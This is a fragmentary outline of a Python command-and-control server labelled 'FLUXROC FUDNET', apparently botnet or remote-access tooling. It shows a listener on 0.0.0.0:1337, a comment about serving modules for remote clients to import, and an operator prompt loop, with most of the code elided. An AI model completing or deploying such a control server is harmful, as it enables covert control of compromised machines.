#!/usr/bin/python
# -*- coding: utf-8 -*-
'Command & Control (FLUXROC FUDNET)'
...
def main():
    ...
    parser = argparse.ArgumentParser(
        prog='server.py',
        description="Command & Control Server (FLUXROC FUDNET)"
    )
    ...
    # host FLXROC modules on C2 port + 1 (for clients to remotely import)
...
class C2():
    ...
    def __init__(self, host='0.0.0.0', port=1337, db=':memory:'):
        ...
        Returns a flxroc.server.C2 instance
    ...
    def run(self):
        ...
        while True:
            try:
                self._active.wait()
                self._prompt = "[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER', 'flxroc'))) % os.getcwd()
